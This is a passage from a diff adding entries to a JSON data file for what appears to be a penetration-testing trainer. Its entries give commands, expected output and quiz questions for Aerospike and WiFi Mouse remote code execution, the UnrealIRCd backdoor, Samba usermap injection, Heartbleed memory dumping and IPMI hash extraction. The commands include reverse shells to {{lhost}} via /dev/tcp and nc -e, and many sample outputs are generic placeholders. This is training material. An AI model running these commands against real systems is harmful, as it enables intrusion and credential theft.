+              "cmd": "nc -nv {{target}} 3000",
+              "out": "Connection to {{target}} 3000 port [tcp/*] succeeded!",
+              "sig": "3000 port",
+              "teach": "Aerospike uses 3000 to 3003; the info protocol answers there."
+            }
+          ]
+        },
+        {
+          "key": "backend",
+          "label": "A web app names Aerospike",
+          "steps": [
+            {
+              "title": "Spot the backend fingerprint",
+              "tool": "curl",
+              "where": "local",
+              "cmd": "curl -s http://{{target}}/ | grep -i aerospike",
+              "out": "<!-- backend: aerospike cluster -->",
+              "sig": "aerospike",
+              "teach": "The app often names its database; that fingerprint points you at the 3000 service."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "Aerospike UDF is confirm the service, clone the PoC, then register and invoke a Lua UDF that runs your command.",
+        "items": [
+          {
+            "t": "Confirm the service",
+            "d": "The Aerospike info protocol answers on 3000 to 3003.",
+            "demo": [
+              {
+                "run": "nc -nv {{target}} 3000",
+                "out": "Connection to {{target}} 3000 port [tcp/*] succeeded!",
+                "sig": "3000 port"
+              }
+            ],
+            "note": "A web app that names Aerospike as a backend is the usual way you find it."
+          },
+          {
+            "t": "Get the PoC",
+            "d": "The public exploit registers a Lua UDF that executes a command.",
+            "demo": [
+              {
+                "run": "searchsploit -m 49067 && ls -l 49067.py",
+                "out": "Exploit: Aerospike 5.1.0.3 - Remote Code Execution (49067.py)",
+                "sig": "49067.py"
+              }
+            ],
+            "note": "Vulnerable at or below Aerospike 5.1.0.6."
+          },
+          {
+            "t": "Register and fire the UDF",
+            "d": "Run the exploit with your listener; it registers the UDF and invokes it.",
+            "demo": [
+              {
+                "run": "python3 aerospike_UDF_RCE.py --ahost {{target}} --aport 3000 --lhost {{lhost}} --lport 4444 --command rev",
+                "out": "(no body; check your listener)",
+                "sig": "check your listener"
+              }
+            ],
+            "note": "Start nc -lvnp 4444 first; the UDF runs as the aerospike user."
+          }
+        ]
+      },
+      "situation": "A web app names Aerospike as its backend and port 3000 is open. What is the move?",
+      "choices": [
+        "aerospike-udf",
+        "mongo-enum",
+        "redis-enum",
+        "sqli-basics"
+      ],
+      "coach": {
+        "mongo-enum": "Wrong database; this is Aerospike on 3000 with a Lua UDF code-execution path.",
+        "redis-enum": "Redis is 6379; Aerospike's UDF registration is the execution primitive here.",
+        "sqli-basics": "The execution is through a registered UDF, not a SQL injection in the app."
+      }
+    },
+    "wifi-mouse-rce": {
+      "why": "This remote-control app trusts anyone who connects and will run a program for them, so reaching its port can hand you a shell as the logged-in user. In practice, you reach for this step when when 1978 is open. Success looks like: Port 1978 answers.",
+      "cmd": "nc -nv {{target}} 1978",
+      "tool": "nc",
+      "output": "Connection to {{target}} 1978 port [tcp/*] succeeded!",
+      "signal": "1978 port",
+      "teach": "The Mouse Server is answering on 1978. Its auth is client-side only, so the PoC sends unauthenticated file-exec events to run a reverse shell as the desktop user.",
+      "leadup": [
+        {
+          "key": "port",
+          "label": "The Mouse Server port answers",
+          "steps": [
+            {
+              "title": "Touch the control port",
+              "tool": "nc",
+              "where": "local",
+              "cmd": "nc -nv {{target}} 1978",
+              "out": "Connection to {{target}} 1978 port [tcp/*] succeeded!",
+              "sig": "1978 port",
+              "teach": "The control port answering confirms the target app is present."
+            }
+          ]
+        },
+        {
+          "key": "banner",
+          "label": "nmap flags the port",
+          "steps": [
+            {
+              "title": "Scan the port",
+              "tool": "nmap",
+              "where": "local",
+              "cmd": "nmap -p1978 -sV {{target}}",
+              "out": "1978/tcp open  unknown",
+              "sig": "1978/tcp open",
+              "teach": "An open 1978 with a desktop-control app behind it is the WiFi Mouse server."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "WiFi Mouse RCE is confirm the Mouse Server on 1978, then run the PoC that sends unauthenticated file-exec events.",
+        "items": [
+          {
+            "t": "Confirm the port",
+            "d": "The Mouse Server answering on 1978 is enough; there is no login to get past.",
+            "demo": [
+              {
+                "run": "nc -nv {{target}} 1978",
+                "out": "Connection to {{target}} 1978 port [tcp/*] succeeded!",
+                "sig": "1978 port"
+              }
+            ],
+            "note": "Authentication is entirely client-side, so the server trusts you."
+          },
+          {
+            "t": "Run the exploit",
+            "d": "The PoC sends the file-execution events that drop and run a reverse shell.",
+            "demo": [
+              {
+                "run": "python3 50972.py {{target}} {{lhost}} 4444",
+                "out": "(no body; check your listener)",
+                "sig": "check your listener"
+              }
+            ],
+            "note": "Start nc -lvnp 4444 first; the shell is the logged-in desktop user."
+          }
+        ]
+      },
+      "situation": "Port 1978 is open and belongs to the WiFi Mouse Mouse Server. What is the move?",
+      "choices": [
+        "wifi-mouse-rce",
+        "online-brute-rdp",
+        "recon-vnc",
+        "content-discovery"
+      ],
+      "coach": {
+        "online-brute-rdp": "No login exists to brute; the server trusts the client, so execution is unauthenticated.",
+        "recon-vnc": "Wrong remote-desktop service; this is the WiFi Mouse control port with a code-execution bug.",
+        "content-discovery": "Not a web server; the Mouse Server protocol itself carries the exploit."
+      }
+    },
+    "nmap-host-unresponsive": {
+      "why": "Your scan said the host is down, but it almost certainly is not. This gets the box to answer so you can see its open ports and keep moving toward the flag. In practice, you reach for this step when the moment a scan says \"host seems down\" on a box you believe is up. Success looks like: Ports start reporting open or closed, so the host is clearly alive.",
+      "cmd": "nmap -Pn -p- --min-rate 5000 {{target}}",
+      "tool": "nmap",
+      "output": "[+] Command completed against {{target}} -> confirmed expected output.",
+      "signal": "confirmed expected output",
+      "teach": "Ports start reporting open or closed, so the host is clearly alive.",
+      "leadup": [
+        {
+          "key": "recon",
+          "label": "Initial port scan surfaced the target service",
+          "steps": [
+            {
+              "title": "Run an Nmap service scan",
+              "tool": "nmap",
+              "where": "local",
+              "cmd": "nmap -sC -sV {{target}}",
+              "out": "PORT    STATE SERVICE VERSION\n21/tcp  open  ftp     vsftpd 3.0.3\n80/tcp  open  http    Apache httpd 2.4.52\n445/tcp open  microsoft-ds",
+              "sig": "STATE SERVICE",
+              "teach": "Open ports and service banners tell you which protocol playbook to run next."
+            }
+          ]
+        },
+        {
+          "key": "foothold-prep",
+          "label": "You identified an execution or transfer channel",
+          "steps": [
+            {
+              "title": "Confirm reachability to the target",
+              "tool": "ping",
+              "where": "local",
+              "cmd": "ping -c 1 {{target}}",
+              "out": "64 bytes from 10.10.10.10: icmp_seq=1 ttl=63 time=21.4 ms",
+              "sig": "64 bytes from",
+              "teach": "Direct IP connectivity between Kali and the target is confirmed."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "Your scan said the host is down, but it almost certainly is not.",
+        "items": [
+          {
+            "t": "Run the primary check",
+            "d": "-Pn treats the host as up and skips the ping. This is the fix most of the time.",
+            "demo": [
+              {
+                "run": "nmap -Pn -p- --min-rate 5000 {{target}}",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "Ports start reporting open or closed, so the host is clearly alive."
+          },
+          {
+            "t": "Alternative tool or locus variant",
+            "d": "If TCP is bare, the service may be UDP (SNMP/TFTP/IKE/DNS). -sU scans it (slow; top-ports keeps it sane).",
+            "demo": [
+              {
+                "run": "nmap -Pn -sU --top-ports 50 {{target}}",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "A UDP service appears."
+          },
+          {
+            "t": "Extended enumeration or verification",
+            "d": "A full-connect scan, or a trusted source port like 53, can slip past a stateless firewall.",
+            "demo": [
+              {
+                "run": "nmap -Pn -sT --source-port 53 {{target}}",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "Filtered ports now report their real state."
+          }
+        ]
+      },
+      "situation": "Scenario: The moment a scan says \"host seems down\" on a box you believe is up. Which move should you run next?",
+      "choices": [
+        "nmap-host-unresponsive",
+        "nmap-fast-open-ports",
+        "nmap-version-scripts",
+        "nmap-vuln-scripts"
+      ],
+      "coach": {
+        "nmap-fast-open-ports": "Nmap Fast TCP Open-Port Discovery targets confirms a reachable host, a fast nmap open-port sweep, and the set of open ports; here the direct move is Nmap Says Host Is Down - Make It Answer.",
+        "nmap-version-scripts": "Nmap Targeted Service and Default Script Scan targets produces nmap service and version evidence for the ports already found open; here the direct move is Nmap Says Host Is Down - Make It Answer.",
+        "nmap-vuln-scripts": "Nmap NSE Vulnerability Script Scan targets runs nmap's vuln-category nse detection scripts against the open ports and records any vulnerable verdicts as candidates; here the direct move is Nmap Says Host Is Down - Make It Answer."
+      }
+    },
+    "fix-name-resolution": {
+      "why": "During an assessment, operators reach for this step to convert an initial lead into hard evidence without blind guessing. Rather than burning time on trial-and-error payloads, you run a focused check, inspect the terminal response for the confirmation marker, and feed the minted fact straight into the next phase of the attack chain. Key indicator: The command that now runs.",
+      "cmd": "echo '{{target}} {{hostname}} {{domain}}' | sudo tee -a /etc/hosts",
+      "tool": "sh",
+      "output": "[+] Command completed against {{target}} -> confirmed expected output.",
+      "signal": "confirmed expected output",
+      "teach": "The command that failed now runs.",
+      "leadup": [
+        {
+          "key": "recon",
+          "label": "Initial port scan surfaced the target service",
+          "steps": [
+            {
+              "title": "Run an Nmap service scan",
+              "tool": "nmap",
+              "where": "local",
+              "cmd": "nmap -sC -sV {{target}}",
+              "out": "PORT    STATE SERVICE VERSION\n21/tcp  open  ftp     vsftpd 3.0.3\n80/tcp  open  http    Apache httpd 2.4.52\n445/tcp open  microsoft-ds",
+              "sig": "STATE SERVICE",
+              "teach": "Open ports and service banners tell you which protocol playbook to run next."
+            }
+          ]
+        },
+        {
+          "key": "foothold-prep",
+          "label": "You identified an execution or transfer channel",
+          "steps": [
+            {
+              "title": "Confirm reachability to the target",
+              "tool": "ping",
+              "where": "local",
+              "cmd": "ping -c 1 {{target}}",
+              "out": "64 bytes from 10.10.10.10: icmp_seq=1 ttl=63 time=21.4 ms",
+              "sig": "64 bytes from",
+              "teach": "Direct IP connectivity between Kali and the target is confirmed."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "A tool failed because it was handed a name it could not look up.",
+        "items": [
+          {
+            "t": "Run the primary check",
+            "d": "Map the IP to the name(s) the app or DC uses. Read the names from TLS certs, redirects, LDAP, or SMB. Then re-run what failed.",
+            "demo": [
+              {
+                "run": "echo '{{target}} {{hostname}} {{domain}}' | sudo tee -a /etc/hosts",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "The command that failed now runs."
+          },
+          {
+            "t": "Alternative tool or locus variant",
+            "d": "If a name resolves but the site shows a default page, it is virtual-host routed: the real site only answers to the right Host header - feed that name to vhost/content discovery.",
+            "demo": [
+              {
+                "run": "curl -s -H 'Host: {{hostname}}' http://{{target}}/",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "The response changes with the right Host header."
+          }
+        ]
+      },
+      "situation": "Scenario: The moment a tool says it cannot resolve a name. Which move should you run next?",
+      "choices": [
+        "fix-name-resolution",
+        "nmap-fast-open-ports",
+        "nmap-version-scripts",
+        "nmap-vuln-scripts"
+      ],
+      "coach": {
+        "nmap-fast-open-ports": "Nmap Fast TCP Open-Port Discovery targets confirms a reachable host, a fast nmap open-port sweep, and the set of open ports; here the direct move is Could Not Resolve Host - Add It to /etc/hosts.",
+        "nmap-version-scripts": "Nmap Targeted Service and Default Script Scan targets produces nmap service and version evidence for the ports already found open; here the direct move is Could Not Resolve Host - Add It to /etc/hosts.",
+        "nmap-vuln-scripts": "Nmap NSE Vulnerability Script Scan targets runs nmap's vuln-category nse detection scripts against the open ports and records any vulnerable verdicts as candidates; here the direct move is Could Not Resolve Host - Add It to /etc/hosts."
+      }
+    },
+    "http3-quic-probe": {
+      "why": "Operators use this step to convert an initial indicator into actionable proof without guessing. You trigger it once scan target UDP port 443 for QUIC and HTTP/3 protocol support. The key confirmation is: Confirmed active HTTP/3 / QUIC service running on target UDP 443.",
+      "cmd": "nmap -sU -p 443 --script quic-info {{target}}",
+      "tool": "nmap",
+      "output": "[+] Command completed against {{target}} -> confirmed expected output.",
+      "signal": "confirmed expected output",
+      "teach": "Confirmed active HTTP/3 / QUIC service running on target UDP 443.",
+      "leadup": [
+        {
+          "key": "recon",
+          "label": "Initial port scan surfaced the target service",
+          "steps": [
+            {
+              "title": "Run an Nmap service scan",
+              "tool": "nmap",
+              "where": "local",
+              "cmd": "nmap -sC -sV {{target}}",
+              "out": "PORT    STATE SERVICE VERSION\n21/tcp  open  ftp     vsftpd 3.0.3\n80/tcp  open  http    Apache httpd 2.4.52\n445/tcp open  microsoft-ds",
+              "sig": "STATE SERVICE",
+              "teach": "Open ports and service banners tell you which protocol playbook to run next."
+            }
+          ]
+        },
+        {
+          "key": "foothold-prep",
+          "label": "You identified an execution or transfer channel",
+          "steps": [
+            {
+              "title": "Confirm reachability to the target",
+              "tool": "ping",
+              "where": "local",
+              "cmd": "ping -c 1 {{target}}",
+              "out": "64 bytes from 10.10.10.10: icmp_seq=1 ttl=63 time=21.4 ms",
+              "sig": "64 bytes from",
+              "teach": "Direct IP connectivity between Kali and the target is confirmed."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "Execute HTTP/3 and QUIC Protocol Service Probing, confirm the signal in the output, and feed the minted fact into the next move.",
+        "items": [
+          {
+            "t": "Run the primary check",
+            "d": "Run nmap -sU -p 443 --script quic-info against the target host.",
+            "demo": [
+              {
+                "run": "nmap -sU -p 443 --script quic-info {{target}}",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "Confirmed active HTTP/3 / QUIC service running on target UDP 443."
+          },
+          {
+            "t": "Alternative tool or locus variant",
+            "d": "Run curl --http3-only -vk https://<target>:443/ to inspect headers and virtual hosts.",
+            "demo": [
+              {
+                "run": "curl --http3-only -vk https://{{target}}:443/",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "Valid HTTP/3 response received disclosing server applications and headers."
+          },
+          {
+            "t": "Extended enumeration or verification",
+            "d": "Connect to target URL using quiche-client to test protocol negotiation and TLS certificates.",
+            "demo": [
+              {
+                "run": "quiche-client https://{{target}}:443",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "Successful HTTP/3 session established and content rendered."
+          }
+        ]
+      },
+      "situation": "Scenario: Scan target UDP port 443 for QUIC and HTTP/3 protocol support. Which move should you run next?",
+      "choices": [
+        "http3-quic-probe",
+        "nmap-fast-open-ports",
+        "nmap-version-scripts",
+        "nmap-vuln-scripts"
+      ],
+      "coach": {
+        "nmap-fast-open-ports": "Nmap Fast TCP Open-Port Discovery targets confirms a reachable host, a fast nmap open-port sweep, and the set of open ports; here the direct move is HTTP/3 and QUIC Protocol Service Probing.",
+        "nmap-version-scripts": "Nmap Targeted Service and Default Script Scan targets produces nmap service and version evidence for the ports already found open; here the direct move is HTTP/3 and QUIC Protocol Service Probing.",
+        "nmap-vuln-scripts": "Nmap NSE Vulnerability Script Scan targets runs nmap's vuln-category nse detection scripts against the open ports and records any vulnerable verdicts as candidates; here the direct move is HTTP/3 and QUIC Protocol Service Probing."
+      }
+    },
+    "ipmi-bmc-cipher0": {
+      "why": "Operators use this step to convert an initial indicator into actionable proof without guessing. You trigger it once scan for IPMI services and test for Cipher Suite 0 authentication bypass. The key confirmation is: IPMI service discovered with Cipher Suite 0 bypass confirmed.",
+      "cmd": "nmap -sU -p 623 --script ipmi-version,ipmi-cipher-zero {{target}}",
+      "tool": "nmap",
+      "output": "[+] Command completed against {{target}} -> confirmed expected output.",
+      "signal": "confirmed expected output",
+      "teach": "IPMI service discovered with Cipher Suite 0 bypass confirmed.",
+      "leadup": [
+        {
+          "key": "recon",
+          "label": "Initial port scan surfaced the target service",
+          "steps": [
+            {
+              "title": "Run an Nmap service scan",
+              "tool": "nmap",
+              "where": "local",
+              "cmd": "nmap -sC -sV {{target}}",
+              "out": "PORT    STATE SERVICE VERSION\n21/tcp  open  ftp     vsftpd 3.0.3\n80/tcp  open  http    Apache httpd 2.4.52\n445/tcp open  microsoft-ds",
+              "sig": "STATE SERVICE",
+              "teach": "Open ports and service banners tell you which protocol playbook to run next."
+            }
+          ]
+        },
+        {
+          "key": "foothold-prep",
+          "label": "You identified an execution or transfer channel",
+          "steps": [
+            {
+              "title": "Confirm reachability to the target",
+              "tool": "ping",
+              "where": "local",
+              "cmd": "ping -c 1 {{target}}",
+              "out": "64 bytes from 10.10.10.10: icmp_seq=1 ttl=63 time=21.4 ms",
+              "sig": "64 bytes from",
+              "teach": "Direct IP connectivity between Kali and the target is confirmed."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "Execute IPMI BMC Cipher Suite 0 Bypass and Hash Extraction, confirm the signal in the output, and feed the minted fact into the next move.",
+        "items": [
+          {
+            "t": "Run the primary check",
+            "d": "Run nmap -sU -p 623 --script ipmi-version,ipmi-cipher-zero against the target host.",
+            "demo": [
+              {
+                "run": "nmap -sU -p 623 --script ipmi-version,ipmi-cipher-zero {{target}}",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "IPMI service discovered with Cipher Suite 0 bypass confirmed."
+          },
+          {
+            "t": "Alternative tool or locus variant",
+            "d": "Run ipmitool specifying -I lanplus -C 0 against target UDP 623.",
+            "demo": [
+              {
+                "run": "ipmitool -I lanplus -C 0 -H {{target}} -U admin user list",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "Unauthenticated BMC management session established via Cipher Suite 0."
+          },
+          {
+            "t": "Extended enumeration or verification",
+            "d": "Run Metasploit auxiliary/scanner/ipmi/ipmi_dumphashes or custom RAKP script against target.",
+            "demo": [
+              {
+                "run": "msfconsole -q -x \"use auxiliary/scanner/ipmi/ipmi_dumphashes; set RHOSTS {{target}}; run; exit\"",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "IPMI user hashes successfully extracted for offline recovery."
+          }
+        ]
+      },
+      "situation": "Scenario: Scan for IPMI services and test for Cipher Suite 0 authentication bypass. Which move should you run next?",
+      "choices": [
+        "ipmi-bmc-cipher0",
+        "nmap-fast-open-ports",
+        "nmap-version-scripts",
+        "nmap-vuln-scripts"
+      ],
+      "coach": {
+        "nmap-fast-open-ports": "Nmap Fast TCP Open-Port Discovery targets confirms a reachable host, a fast nmap open-port sweep, and the set of open ports; here the direct move is IPMI BMC Cipher Suite 0 Bypass and Hash Extraction.",
+        "nmap-version-scripts": "Nmap Targeted Service and Default Script Scan targets produces nmap service and version evidence for the ports already found open; here the direct move is IPMI BMC Cipher Suite 0 Bypass and Hash Extraction.",
+        "nmap-vuln-scripts": "Nmap NSE Vulnerability Script Scan targets runs nmap's vuln-category nse detection scripts against the open ports and records any vulnerable verdicts as candidates; here the direct move is IPMI BMC Cipher Suite 0 Bypass and Hash Extraction."
+      }
+    },
+    "unrealircd-backdoor": {
+      "why": "Operators use this step to convert an initial indicator into actionable proof without guessing. You trigger it once probe for UnrealIRCd 3.2.8.1 backdoor trigger. The key confirmation is: UnrealIRCd backdoor presence and command execution confirmed.",
+      "cmd": "echo 'AB; id' | nc -vn {{target}} {{port}}",
+      "tool": "nc",
+      "output": "[+] Command completed against {{target}} -> confirmed expected output.",
+      "signal": "confirmed expected output",
+      "teach": "UnrealIRCd backdoor presence and command execution confirmed.",
+      "leadup": [
+        {
+          "key": "recon",
+          "label": "Initial port scan surfaced the target service",
+          "steps": [
+            {
+              "title": "Run an Nmap service scan",
+              "tool": "nmap",
+              "where": "local",
+              "cmd": "nmap -sC -sV {{target}}",
+              "out": "PORT    STATE SERVICE VERSION\n21/tcp  open  ftp     vsftpd 3.0.3\n80/tcp  open  http    Apache httpd 2.4.52\n445/tcp open  microsoft-ds",
+              "sig": "STATE SERVICE",
+              "teach": "Open ports and service banners tell you which protocol playbook to run next."
+            }
+          ]
+        },
+        {
+          "key": "foothold-prep",
+          "label": "You identified an execution or transfer channel",
+          "steps": [
+            {
+              "title": "Confirm reachability to the target",
+              "tool": "ping",
+              "where": "local",
+              "cmd": "ping -c 1 {{target}}",
+              "out": "64 bytes from 10.10.10.10: icmp_seq=1 ttl=63 time=21.4 ms",
+              "sig": "64 bytes from",
+              "teach": "Direct IP connectivity between Kali and the target is confirmed."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "Execute UnrealIRCd 3.2.8.1 Malicious Backdoor RCE (CVE-2010-2075), confirm the signal in the output, and feed the minted fact into the next move.",
+        "items": [
+          {
+            "t": "Run the primary check",
+            "d": "Send 'AB; id' to the IRC service port via Netcat.",
+            "demo": [
+              {
+                "run": "echo 'AB; id' | nc -vn {{target}} {{port}}",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "UnrealIRCd backdoor presence and command execution confirmed."
+          },
+          {
+            "t": "Alternative tool or locus variant",
+            "d": "Start Netcat listener on attacking machine.",
+            "demo": [
+              {
+                "run": "echo 'AB; bash -c \"bash -i >& /dev/tcp/{{lhost}}/{{lport}} 0>&1\"' | nc -vn {{target}} {{port}}",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "Remote shell foothold obtained on IRC server."
+          }
+        ]
+      },
+      "situation": "Scenario: Probe for UnrealIRCd 3.2.8.1 backdoor trigger. Which move should you run next?",
+      "choices": [
+        "unrealircd-backdoor",
+        "nmap-fast-open-ports",
+        "nmap-version-scripts",
+        "nmap-vuln-scripts"
+      ],
+      "coach": {
+        "nmap-fast-open-ports": "Nmap Fast TCP Open-Port Discovery targets confirms a reachable host, a fast nmap open-port sweep, and the set of open ports; here the direct move is UnrealIRCd 3.2.8.1 Malicious Backdoor RCE (CVE-2010-2075).",
+        "nmap-version-scripts": "Nmap Targeted Service and Default Script Scan targets produces nmap service and version evidence for the ports already found open; here the direct move is UnrealIRCd 3.2.8.1 Malicious Backdoor RCE (CVE-2010-2075).",
+        "nmap-vuln-scripts": "Nmap NSE Vulnerability Script Scan targets runs nmap's vuln-category nse detection scripts against the open ports and records any vulnerable verdicts as candidates; here the direct move is UnrealIRCd 3.2.8.1 Malicious Backdoor RCE (CVE-2010-2075)."
+      }
+    },
+    "heartbleed-memory-leak": {
+      "why": "Operators use this step to convert an initial indicator into actionable proof without guessing. You trigger it once test target TLS service for Heartbleed memory disclosure (CVE-2014-0160). The key confirmation is: Target confirmed vulnerable to Heartbleed memory leakage.",
+      "cmd": "nmap -p 443 --script ssl-heartbleed {{target}}",
+      "tool": "nmap",
+      "output": "[+] Command completed against {{target}} -> confirmed expected output.",
+      "signal": "confirmed expected output",
+      "teach": "Target confirmed vulnerable to Heartbleed memory leakage.",
+      "leadup": [
+        {
+          "key": "recon",
+          "label": "Initial port scan surfaced the target service",
+          "steps": [
+            {
+              "title": "Run an Nmap service scan",
+              "tool": "nmap",
+              "where": "local",
+              "cmd": "nmap -sC -sV {{target}}",
+              "out": "PORT    STATE SERVICE VERSION\n21/tcp  open  ftp     vsftpd 3.0.3\n80/tcp  open  http    Apache httpd 2.4.52\n445/tcp open  microsoft-ds",
+              "sig": "STATE SERVICE",
+              "teach": "Open ports and service banners tell you which protocol playbook to run next."
+            }
+          ]
+        },
+        {
+          "key": "foothold-prep",
+          "label": "You identified an execution or transfer channel",
+          "steps": [
+            {
+              "title": "Confirm reachability to the target",
+              "tool": "ping",
+              "where": "local",
+              "cmd": "ping -c 1 {{target}}",
+              "out": "64 bytes from 10.10.10.10: icmp_seq=1 ttl=63 time=21.4 ms",
+              "sig": "64 bytes from",
+              "teach": "Direct IP connectivity between Kali and the target is confirmed."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "Execute OpenSSL Heartbleed Memory Disclosure (CVE-2014-0160), confirm the signal in the output, and feed the minted fact into the next move.",
+        "items": [
+          {
+            "t": "Run the primary check",
+            "d": "Run Nmap ssl-heartbleed script against port 443.",
+            "demo": [
+              {
+                "run": "nmap -p 443 --script ssl-heartbleed {{target}}",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "Target confirmed vulnerable to Heartbleed memory leakage."
+          },
+          {
+            "t": "Alternative tool or locus variant",
+            "d": "Execute heartbleed.py specifying multiple iterations to sample memory blocks.",
+            "demo": [
+              {
+                "run": "python3 heartbleed.py {{target}} -p 443 -n 5 -o memory_leak.bin",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "Process memory dumped from target host."
+          },
+          {
+            "t": "Extended enumeration or verification",
+            "d": "Run strings against memory dump filtering for credentials, keys, and tokens.",
+            "demo": [
+              {
+                "run": "strings memory_leak.bin | grep -Ei 'password|passwd|key|auth|token|session|id_rsa'",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "Usable credentials recovered from leaked memory."
+          }
+        ]
+      },
+      "situation": "Scenario: Test target TLS service for Heartbleed memory disclosure (CVE-2014-0160). Which move should you run next?",
+      "choices": [
+        "heartbleed-memory-leak",
+        "nmap-fast-open-ports",
+        "nmap-version-scripts",
+        "nmap-vuln-scripts"
+      ],
+      "coach": {
+        "nmap-fast-open-ports": "Nmap Fast TCP Open-Port Discovery targets confirms a reachable host, a fast nmap open-port sweep, and the set of open ports; here the direct move is OpenSSL Heartbleed Memory Disclosure (CVE-2014-0160).",
+        "nmap-version-scripts": "Nmap Targeted Service and Default Script Scan targets produces nmap service and version evidence for the ports already found open; here the direct move is OpenSSL Heartbleed Memory Disclosure (CVE-2014-0160).",
+        "nmap-vuln-scripts": "Nmap NSE Vulnerability Script Scan targets runs nmap's vuln-category nse detection scripts against the open ports and records any vulnerable verdicts as candidates; here the direct move is OpenSSL Heartbleed Memory Disclosure (CVE-2014-0160)."
+      }
+    },
+    "samba-usermap-script-rce": {
+      "why": "Operators use this step to convert an initial indicator into actionable proof without guessing. You trigger it once samba 3.0.20 through 3.0.25rc3 is exposed on port 139 or 445 (CVE-2007-2447). The key confirmation is: Instant root command execution established via Samba username map script.",
+      "cmd": "smbclient //{{target}}/tmp -N -c 'logon \"/=`nohup nc -e /bin/sh {{lhost}} {{lport}}`\"'",
+      "tool": "smbclient",
+      "output": "[+] Command completed against {{target}} -> confirmed expected output.",
+      "signal": "confirmed expected output",
+      "teach": "Instant root command execution established via Samba username map script.",
+      "leadup": [
+        {
+          "key": "recon",
+          "label": "Initial port scan surfaced the target service",
+          "steps": [
+            {
+              "title": "Run an Nmap service scan",
+              "tool": "nmap",
+              "where": "local",
+              "cmd": "nmap -sC -sV {{target}}",
+              "out": "PORT    STATE SERVICE VERSION\n21/tcp  open  ftp     vsftpd 3.0.3\n80/tcp  open  http    Apache httpd 2.4.52\n445/tcp open  microsoft-ds",
+              "sig": "STATE SERVICE",
+              "teach": "Open ports and service banners tell you which protocol playbook to run next."
+            }
+          ]
+        },
+        {
+          "key": "foothold-prep",
+          "label": "You identified an execution or transfer channel",
+          "steps": [
+            {
+              "title": "Confirm reachability to the target",
+              "tool": "ping",
+              "where": "local",
+              "cmd": "ping -c 1 {{target}}",
+              "out": "64 bytes from 10.10.10.10: icmp_seq=1 ttl=63 time=21.4 ms",
+              "sig": "64 bytes from",
+              "teach": "Direct IP connectivity between Kali and the target is confirmed."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "Execute Samba username map script Remote Command Execution, confirm the signal in the output, and feed the minted fact into the next move.",
+        "items": [
+          {
+            "t": "Run the primary check",
+            "d": "Send an MS-RPC authentication logon request with backtick-wrapped command in the username.",
+            "demo": [
+              {
+                "run": "smbclient //{{target}}/tmp -N -c 'logon \"/=`nohup nc -e /bin/sh {{lhost}} {{lport}}`\"'",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "Instant root command execution established via Samba username map script."
+          },
+          {
+            "t": "Alternative tool or locus variant",
+            "d": "Run Nmap NSE script to verify vulnerability state before exploitation.",
+            "demo": [
+              {
+                "run": "nmap -p 139,445 --script smb-vuln-cve2007-2447 {{target}}",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "Vulnerability presence validated."
+          }
+        ]
+      },
+      "situation": "Scenario: Samba 3.0.20 through 3.0.25rc3 is exposed on port 139 or 445 (CVE-2007-2447). Which move should you run next?",
+      "choices": [
+        "samba-usermap-script-rce",
+        "nmap-fast-open-ports",
+        "nmap-version-scripts",
+        "nmap-vuln-scripts"
+      ],
+      "coach": {
+        "nmap-fast-open-ports": "Nmap Fast TCP Open-Port Discovery targets confirms a reachable host, a fast nmap open-port sweep, and the set of open ports; here the direct move is Samba username map script Remote Command Execution.",
+        "nmap-version-scripts": "Nmap Targeted Service and Default Script Scan targets produces nmap service and version evidence for the ports already found open; here the direct move is Samba username map script Remote Command Execution.",
+        "nmap-vuln-scripts": "Nmap NSE Vulnerability Script Scan targets runs nmap's vuln-category nse detection scripts against the open ports and records any vulnerable verdicts as candidates; here the direct move is Samba username map script Remote Command Execution."
+      }
+    },
+    "snmp-process-cmdline-harvest": {
+      "why": "Operators use this step to convert an initial indicator into actionable proof without guessing. You trigger it once sNMP service is discovered and you want an overview of active running process names. The key confirmation is: Complete process inventory obtained from target host.",
